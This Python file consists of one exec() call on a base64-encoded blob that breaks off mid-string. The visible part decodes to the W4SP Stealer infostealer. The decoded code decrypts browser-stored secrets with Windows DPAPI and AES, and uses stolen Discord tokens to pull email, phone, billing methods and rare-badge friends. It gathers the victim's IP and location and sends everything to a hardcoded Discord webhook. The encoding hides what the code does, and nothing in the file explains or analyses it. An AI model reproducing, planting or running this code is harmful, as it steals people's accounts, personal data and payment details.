exec(base64.b64decode("""aG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDQxNjgzMjkyMTA3MzI5NTQ2L1hQV1VLRThEXzRoOWRjalh3X2thWlNDWXkyb0Z6YWowd0VGWGt1YzNhMXBnWEc1dzVkd1k2dFp3ZGtjbkUwekFLa3JFIgpERVRFQ1RFRCA9IEZhbHNlCgoKZGVmIGdldGlwKCk6CiAgICBpcCA9ICJOb25lIgogICAgdHJ5OgogICAgICAgIGlwID0gdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2FwaS5pcGlmeS5vcmciKSkucmVhZCgpLmRlY29kZSgpLnN0cmlwKCkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCiAgICByZXR1cm4gaXAKCnJlcXVpcmVtZW50cyA9IFsKICAgIFsicmVxdWVzdHMiLCAicmVxdWVzdHMiXSwKICAgIFsiQ3J5cHRvLkNpcGhlciIsICJweWNyeXB0b2RvbWUiXQpdCmZvciBtb2RsIGluIHJlcXVpcmVtZW50czoKICAgIHRyeTogX19pbXBvcnRfXyhtb2RsWzBdKQogICAgZXhjZXB0OgogICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ7ZXhlY3V0YWJsZX0gLW0gcGlwIGluc3RhbGwge21vZGxbMV19Iiwgc2hlbGw9VHJ1ZSkKICAgICAgICB0aW1lLnNsZWVwKDMpCgppbXBvcnQgcmVxdWVzdHMKZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBBRVMKCmxvY2FsID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpyb2FtaW5nID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKdGVtcCA9IG9zLmdldGVudigiVEVNUCIpClRocmVhZGxpc3QgPSBbXQoKCmNsYXNzIERBVEFfQkxPQihTdHJ1Y3R1cmUpOgogICAgX2ZpZWxkc18gPSBbCiAgICAgICAgKCdjYkRhdGEnLCB3aW50eXBlcy5EV09SRCksCiAgICAgICAgKCdwYkRhdGEnLCBQT0lOVEVSKGNfY2hhcikpCiAgICBdCgpkZWYgR2V0RGF0YShibG9iX291dCk6CiAgICBjYkRhdGEgPSBpbnQoYmxvYl9vdXQuY2JEYXRhKQogICAgcGJEYXRhID0gYmxvYl9vdXQucGJEYXRhCiAgICBidWZmZXIgPSBjX2J1ZmZlcihjYkRhdGEpCiAgICBjZGxsLm1zdmNydC5tZW1jcHkoYnVmZmVyLCBwYkRhdGEsIGNiRGF0YSkKICAgIHdpbmRsbC5rZXJuZWwzMi5Mb2NhbEZyZWUocGJEYXRhKQogICAgcmV0dXJuIGJ1ZmZlci5yYXcKCmRlZiBDcnlwdFVucHJvdGVjdERhdGEoZW5jcnlwdGVkX2J5dGVzLCBlbnRyb3B5PWInJyk6CiAgICBidWZmZXJfaW4gPSBjX2J1ZmZlcihlbmNyeXB0ZWRfYnl0ZXMsIGxlbihlbmNyeXB0ZWRfYnl0ZXMpKQogICAgYnVmZmVyX2VudHJvcHkgPSBjX2J1ZmZlcihlbnRyb3B5LCBsZW4oZW50cm9weSkpCiAgICBibG9iX2luID0gREFUQV9CTE9CKGxlbihlbmNyeXB0ZWRfYnl0ZXMpLCBidWZmZXJfaW4pCiAgICBibG9iX2VudHJvcHkgPSBEQVRBX0JMT0IobGVuKGVudHJvcHkpLCBidWZmZXJfZW50cm9weSkKICAgIGJsb2Jfb3V0ID0gREFUQV9CTE9CKCkKCiAgICBpZiB3aW5kbGwuY3J5cHQzMi5DcnlwdFVucHJvdGVjdERhdGEoYnlyZWYoYmxvYl9pbiksIE5vbmUsIGJ5cmVmKGJsb2JfZW50cm9weSksIE5vbmUsIE5vbmUsIDB4MDEsIGJ5cmVmKGJsb2Jfb3V0KSk6CiAgICAgICAgcmV0dXJuIEdldERhdGEoYmxvYl9vdXQpCgpkZWYgRGVjcnlwdFZhbHVlKGJ1ZmYsIG1hc3Rlcl9rZXk9Tm9uZSk6CiAgICBzdGFydHMgPSBidWZmLmRlY29kZShlbmNvZGluZz0ndXRmOCcsIGVycm9ycz0naWdub3JlJylbOjNdCiAgICBpZiBzdGFydHMgPT0gJ3YxMCcgb3Igc3RhcnRzID09ICd2MTEnOgogICAgICAgIGl2ID0gYnVmZlszOjE1XQogICAgICAgIHBheWxvYWQgPSBidWZmWzE1Ol0KICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBjaXBoZXIuZGVjcnlwdChwYXlsb2FkKQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3NbOi0xNl0uZGVjb2RlKCkKICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MKCmRlZiBMb2FkUmVxdWVzdHMobWV0aG9kZSwgdXJsLCBkYXRhPScnLCBmaWxlcz0nJywgaGVhZGVycz0nJyk6CiAgICBmb3IgaSBpbiByYW5nZSg4KTogIyBtYXggdHJ5cwogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgbWV0aG9kZSA9PSAnUE9TVCc6CiAgICAgICAgICAgICAgICBpZiBkYXRhICE9ICcnOgogICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT1kYXRhKQogICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgICAgICAgICAgZWxpZiBmaWxlcyAhPSAnJzoKICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGZpbGVzPWZpbGVzKQogICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwIG9yIHIuc3RhdHVzX2NvZGUgPT0gNDEzOiAjIDQxMyA9IERBVEEgVE8gQklHCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCgpkZWYgTG9hZFVybGliKGhvb2ssIGRhdGE9JycsIGZpbGVzPScnLCBoZWFkZXJzPScnKToKICAgIGZvciBpIGluIHJhbmdlKDgpOgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgaGVhZGVycyAhPSAnJzoKICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhLCBoZWFkZXJzPWhlYWRlcnMpKQogICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhKSkKICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgZXhjZXB0OiAKICAgICAgICAgICAgcGFzcwoKZGVmIGdsb2JhbEluZm8oKToKICAgIGlwID0gZ2V0aXAoKQogICAgdXNlcm5hbWUgPSBvcy5nZXRlbnYoIlVTRVJOQU1FIikKICAgIGlwZGF0YW5vanNvbiA9IHVybG9wZW4oUmVxdWVzdChmImh0dHBzOi8vZ2VvbG9jYXRpb24tZGIuY29tL2pzb25wL3tpcH0iKSkucmVhZCgpLmRlY29kZSgpLnJlcGxhY2UoJ2NhbGxiYWNrKCcsICcnKS5yZXBsYWNlKCd9KScsICd9JykKICAgICMgcHJpbnQoaXBkYXRhbm9qc29uKQogICAgaXBkYXRhID0gbG9hZHMoaXBkYXRhbm9qc29uKQogICAgIyBwcmludCh1cmxvcGVuKFJlcXVlc3QoZiJodHRwczovL2dlb2xvY2F0aW9uLWRiLmNvbS9qc29ucC97aXB9IikpLnJlYWQoKS5kZWNvZGUoKSkKICAgIGNvbnRyeSA9IGlwZGF0YVsiY291bnRyeV9uYW1lIl0KICAgIGNvbnRyeUNvZGUgPSBpcGRhdGFbImNvdW50cnlfY29kZSJdLmxvd2VyKCkKICAgIGdsb2JhbGluZm8gPSBmIjpmbGFnX3tjb250cnlDb2RlfTogIC0gYHt1c2VybmFtZS51cHBlcigpfSB8IHtpcH0gKHtjb250cnl9KWAiCiAgICAjIHByaW50KGdsb2JhbGluZm8pCiAgICByZXR1cm4gZ2xvYmFsaW5mbwoKCmRlZiBUcnVzdChDb29raWVzKToKICAgICMgc2ltcGxlIFRydXN0IEZhY3RvciBzeXN0ZW0KICAgIGdsb2JhbCBERVRFQ1RFRAogICAgZGF0YSA9IHN0cihDb29raWVzKQogICAgdGltID0gcmUuZmluZGFsbCgiLmdvb2dsZS5jb20iLCBkYXRhKQogICAgIyBwcmludChsZW4odGltKSkKICAgIGlmIGxlbih0aW0pIDwgLTE6CiAgICAgICAgREVURUNURUQgPSBUcnVlCiAgICAgICAgcmV0dXJuIERFVEVDVEVECiAgICBlbHNlOgogICAgICAgIERFVEVDVEVEID0gRmFsc2UKICAgICAgICByZXR1cm4gREVURUNURUQKICAgICAgICAKZGVmIEdldFVIUUZyaWVuZHModG9rZW4pOgogICAgYmFkZ2VMaXN0ID0gIFsKICAgICAgICB7Ik5hbWUiOiAnRWFybHlfVmVyaWZpZWRfQm90X0RldmVsb3BlcicsICdWYWx1ZSc6IDEzMTA3MiwgJ0Vtb2ppJzogIjw6ZGV2ZWxvcGVyOjg3NDc1MDgwODQ3MjgyNTk4Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICdWYWx1ZSc6IDE2Mzg0LCAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdFYXJseV9TdXBwb3J0ZXInLCAnVmFsdWUnOiA1MTIsICdFbW9qaSc6ICI8OmVhcmx5X3N1cHBvcnRlcjo4NzQ3NTA4MDg0MTQxMTM4MjM+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CYWxhbmNlJywgJ1ZhbHVlJzogMjU2LCAnRW1vamknOiAiPDpiYWxhbmNlOjg3NDc1MDgwODI2NzI5MjY4Mz4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAnVmFsdWUnOiAxMjgsICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQnJhdmVyeScsICdWYWx1ZSc6IDY0LCAnRW1vamknOiAiPDpicmF2ZXJ5Ojg3NDc1MDgwODM4ODk1MjA3NT4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMScsICdWYWx1ZSc6IDgsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8xOjg3NDc1MDgwODQyNjY5MjY1OD4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0h5cGVTcXVhZF9FdmVudHMnLCAnVmFsdWUnOiA0LCAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ1BhcnRuZXJlZF9TZXJ2ZXJfT3duZXInLCAnVmFsdWUnOiAyLCdFbW9qaSc6ICI8OnBhcnRuZXI6ODc0NzUwODA4Njc4MzU0OTY0PiAifSwKICAgICAgICB7Ik5hbWUiOiAnRGlzY29yZF9FbXBsb3llZScsICdWYWx1ZSc6IDEsICdFbW9qaSc6ICI8OnN0YWZmOjg3NDc1MDgwODcyODY2NjE1Mj4gIn0KICAgIF0KICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQogICAgdHJ5OgogICAgICAgIGZyaWVuZGxpc3QgPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9yZWxhdGlvbnNoaXBzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKICAgIHVocWxpc3QgPSAnJwogICAgZm9yIGZyaWVuZCBpbiBmcmllbmRsaXN0OgogICAgICAgIE93bmVkQmFkZ2VzID0gJycKICAgICAgICBmbGFncyA9IGZyaWVuZFsndXNlciddWydwdWJsaWNfZmxhZ3MnXQogICAgICAgIGZvciBiYWRnZSBpbiBiYWRnZUxpc3Q6CiAgICAgICAgICAgIGlmIGZsYWdzIC8vIGJhZGdlWyJWYWx1ZSJdICE9IDAgYW5kIGZyaWVuZFsndHlwZSddID09IDE6CiAgICAgICAgICAgICAgICBpZiBub3QgIkhvdXNlIiBpbiBiYWRnZVsiTmFtZSJdOgogICAgICAgICAgICAgICAgICAgIE93bmVkQmFkZ2VzICs9IGJhZGdlWyJFbW9qaSJdCiAgICAgICAgICAgICAgICBmbGFncyA9IGZsYWdzICUgYmFkZ2VbIlZhbHVlIl0KICAgICAgICBpZiBPd25lZEJhZGdlcyAhPSAnJzoKICAgICAgICAgICAgdWhxbGlzdCArPSBmIntPd25lZEJhZGdlc30gfCB7ZnJpZW5kWyd1c2VyJ11bJ3VzZXJuYW1lJ119I3tmcmllbmRbJ3VzZXInXVsnZGlzY3JpbWluYXRvciddfSAoe2ZyaWVuZFsndXNlciddWydpZCddfSlcbiIKICAgIHJldHVybiB1aHFsaXN0CgoKZGVmIEdldEJpbGxpbmcodG9rZW4pOgogICAgaGVhZGVycyA9IHsKICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLAogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CiAgICB0cnk6CiAgICAgICAgYmlsbGluZ2pzb24gPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3VzZXJzL0BtZS9iaWxsaW5nL3BheW1lbnQtc291cmNlcyIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkKICAgIGV4Y2VwdDoKICAgICAgICByZXR1cm4gRmFsc2UKICAgIAogICAgaWYgYmlsbGluZ2pzb24gPT0gW106IHJldHVybiAiIC0iCgogICAgYmlsbGluZyA9ICIiCiAgICBmb3IgbWV0aG9kZSBpbiBiaWxsaW5nanNvbjoKICAgICAgICBpZiBtZXRob2RlWyJpbnZhbGlkIl0gPT0gRmFsc2U6CiAgICAgICAgICAgIGlmIG1ldGhvZGVbInR5cGUiXSA9PSAxOgogICAgICAgICAgICAgICAgYmlsbGluZyArPSAiOmNyZWRpdF9jYXJkOiIKICAgICAgICAgICAgZWxpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMjoKICAgICAgICAgICAgICAgIGJpbGxpbmcgKz0gIjpwYXJraW5nOiAiCgogICAgcmV0dXJuIGJpbGxpbmcKCgpkZWYgR2V0QmFkZ2UoZmxhZ3MpOgogICAgaWYgZmxhZ3MgPT0gMDogcmV0dXJuICcnCgogICAgT3duZWRCYWRnZXMgPSAnJwogICAgYmFkZ2VMaXN0ID0gIFsKICAgICAgICB7Ik5hbWUiOiAnRWFybHlfVmVyaWZpZWRfQm90X0RldmVsb3BlcicsICdWYWx1ZSc6IDEzMTA3MiwgJ0Vtb2ppJzogIjw6ZGV2ZWxvcGVyOjg3NDc1MDgwODQ3MjgyNTk4Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICdWYWx1ZSc6IDE2Mzg0LCAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdFYXJseV9TdXBwb3J0ZXInLCAnVmFsdWUnOiA1MTIsICdFbW9qaSc6ICI8OmVhcmx5X3N1cHBvcnRlcjo4NzQ3NTA4MDg0MTQxMTM4MjM+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CYWxhbmNlJywgJ1ZhbHVlJzogMjU2LCAnRW1vamknOiAiPDpiYWxhbmNlOjg3NDc1MDgwODI2NzI5MjY4Mz4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAnVmFsdWUnOiAxMjgsICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQnJhdmVyeScsICdWYWx1ZSc6IDY0LCAnRW1vamknOiAiPDpicmF2ZXJ5Ojg3NDc1MDgwODM4ODk1MjA3NT4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMScsICdWYWx1ZSc6IDgsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8xOjg3NDc1MDgwODQyNjY5MjY1OD4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0h5cGVTcXVhZF9FdmVudHMnLCAnVmFsdWUnOiA0LCAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ1BhcnRuZXJlZF9TZXJ2ZXJfT3duZXInLCAnVmFsdWUnOiAyLCdFbW9qaSc6ICI8OnBhcnRuZXI6ODc0NzUwODA4Njc4MzU0OTY0PiAifSwKICAgICAgICB7Ik5hbWUiOiAnRGlzY29yZF9FbXBsb3llZScsICdWYWx1ZSc6IDEsICdFbW9qaSc6ICI8OnN0YWZmOjg3NDc1MDgwODcyODY2NjE1Mj4gIn0KICAgIF0KICAgIGZvciBiYWRnZSBpbiBiYWRnZUxpc3Q6CiAgICAgICAgaWYgZmxhZ3MgLy8gYmFkZ2VbIlZhbHVlIl0gIT0gMDoKICAgICAgICAgICAgT3duZWRCYWRnZXMgKz0gYmFkZ2VbIkVtb2ppIl0KICAgICAgICAgICAgZmxhZ3MgPSBmbGFncyAlIGJhZGdlWyJWYWx1ZSJdCgogICAgcmV0dXJuIE93bmVkQmFkZ2VzCgpkZWYgR2V0VG9rZW5JbmZvKHRva2VuKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQoKICAgIHVzZXJqc29uID0gbG9hZHModXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUiLCBoZWFkZXJzPWhlYWRlcnMpKS5yZWFkKCkuZGVjb2RlKCkpCiAgICB1c2VybmFtZSA9IHVzZXJqc29uWyJ1c2VybmFtZSJdCiAgICBoYXNodGFnID0gdXNlcmpzb25bImRpc2NyaW1pbmF0b3IiXQogICAgZW1haWwgPSB1c2VyanNvblsiZW1haWwiXQogICAgaWRkID0gdXNlcmpzb25bImlkIl0KICAgIHBmcCA9IHVzZXJqc29uWyJhdmF0YXIiXQogICAgZmxhZ3MgPSB1c2VyanNvblsicHVibGljX2ZsYWdzIl0KICAgIG5pdHJvID0gIiIKICAgIHBob25lID0gIi0iCgogICAgaWYgInByZW1pdW1fdHlwZSIgaW4gdXNlcmpzb246IAogICAgICAgIG5pdHJvdCA9IHVzZXJqc29uWyJwcmVtaXVtX3R5cGUiXQogICAgICAgIGlmIG5pdHJvdCA9PSAxOgogICAgICAgICAgICBuaXRybyA9ICI8OmNsYXNzaWM6ODk2MTE5MTcxMDE5MDY3NDIzPiAiCiAgICAgICAgZWxpZiBuaXRyb3QgPT0gMjoKICAgICAgICAgICAgbml0cm8gPSAiPGE6Ym9vc3Q6ODI0MDM2Nzc4NTcwNDE2MTI5PiA8OmNsYXNzaWM6ODk2MTE5MTcxMDE5MDY3NDIzPiAiCiAgICBpZiAicGhvbmUiIGluIHVzZXJqc29uOiBwaG9uZSA9IGYnYHt1c2VyanNvblsicGhvbmUiXX1gJwoKICAgIHJldHVybiB1c2VybmFtZSwgaGFzaHRhZywgZW1haWwsIGlkZCwgcGZwLCBmbGFncywgbml0cm8sIHBob25lCgpkZWYgY2hlY2tUb2tlbih0b2tlbik6CiAgICBoZWFkZXJzID0gewogICAgICAgICJBdXRob3JpemF0aW9uIjogdG9rZW4sCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KICAgIHRyeToKICAgICAgICB1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9aGVhZGVycykpCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGV4Y2VwdDoKICAgICAgICByZXR1cm4gRmFsc2UKCgpkZWYgdXBsb2FkVG9rZW4odG9rZW4sIHBhdGgpOgogICAgZ2xvYmFsIGhvb2sKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KICAgIHVzZXJuYW1lLCBoYXNodGFnLCBlbWFpbCwgaWRkLCBwZnAsIGZsYWdzLCBuaXRybywgcGhvbmUgPSBHZXRUb2tlbkluZm8odG9rZW4pCgogICAgaWYgcGZwID09IE5vbmU6IAogICAgICAgIHBmcCA9ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyNTkzMTg0MjUxMTgzMTk1LzdjOGY0NzYxMjNkMjhkMTAzZWZlMzgxNTQzMjc0YzI1LnBuZyIKICAgIGVsc2U6CiAgICAgICAgcGZwID0gZiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzL3tpZGR9L3twZnB9IgoKICAgIGJpbGxpbmcgPSBHZXRCaWxsaW5nKHRva2VuKQogICAgYmFkZ2UgPSBHZXRCYWRnZShmbGFncykKICAgIGZyaWVuZHMgPSBHZXRVSFFGcmllbmRzKHRva2VuKQogICAgaWYgZnJpZW5kcyA9PSAnJzogZnJpZW5kcyA9ICJObyBSYXJlIEZyaWVuZHMiCiAgICBpZiBub3QgYmlsbGluZzoKICAgICAgICBiYWRnZSwgcGhvbmUsIGJpbGxpbmcgPSAi8J+UkiIsICLwn5SSIiwgIvCflJIiCiAgICBpZiBuaXRybyA9PSAnJyBhbmQgYmFkZ2UgPT0gJyc6IG5pdHJvID0gIiAtIgoKICAgIGRhdGEgPSB7CiAgICAgICAgImNvbnRlbnQiOiBmJ3tnbG9iYWxJbmZvKCl9IHwgRm91bmQgaW4gYHtwYXRofWAnLAogICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgIHsKICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsCiAgICAgICAgICAgICJmaWVsZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOnJvY2tldDogVG9rZW46IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmImB7dG9rZW59YFxuW0NsaWNrIHRvIGNvcHldKGh0dHBzOi8vc3VwZXJmdXJyeWNkbi5ubC9jb3B5L3t0b2tlbn0pIgogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6ZW52ZWxvcGU6IEVtYWlsOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge2VtYWlsfWAiLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjptb2JpbGVfcGhvbmU6IFBob25lOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7cGhvbmV9IiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6Z2xvYmVfd2l0aF9tZXJpZGlhbnM6IElQOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge2dldGlwKCl9YCIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOmJlZ2lubmVyOiBCYWRnZXM6IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmIntuaXRyb317YmFkZ2V9IiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6Y3JlZGl0X2NhcmQ6IEJpbGxpbmc6IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmIntiaWxsaW5nfSIsCiAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOmNsb3duOiBIUSBGcmllbmRzOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7ZnJpZW5kc30iLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBGYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgImF1dGhvciI6IHsKICAgICAgICAgICAgICAgICJuYW1lIjogZiJ7dXNlcm5hbWV9I3toYXNodGFnfSAoe2lkZH0pIiwKICAgICAgICAgICAgICAgICJpY29uX3VybCI6IGYie3BmcH0iCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgInRleHQiOiAiQFc0U1AgU1RFQUxFUiIsCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJ0aHVtYm5haWwiOiB7CiAgICAgICAgICAgICAgICAidXJsIjogZiJ7cGZwfSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIF0sCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyIsCiAgICAgICAgInVzZXJuYW1lIjogIlc0U1AgU3RlYWxlciIsCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICB9CiAgICAjIHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpKQogICAgTG9hZFVybGliKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKCmRlZiBSZWZvcm1hdChsaXN0dCk6CiAgICBlID0gcmUuZmluZGFsbCgiKFx3K1thLXpdKSIsbGlzdHQpCiAgICB3aGlsZSAiaHR0cHMiIGluIGU6IGUucmVtb3ZlKCJodHRwcyIpCiAgICB3aGlsZSAiY29tIiBpbiBlOiBlLnJlbW92ZSgiY29tIikKICAgIHdoaWxlICJuZXQiIGluIGU6IGUucmVtb3ZlKCJuZXQiKQogICAgcmV0dXJuIGxpc3Qoc2V0KGUpKQoKZGVmIHVwbG9hZChuYW1lLCBsaW5rKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1B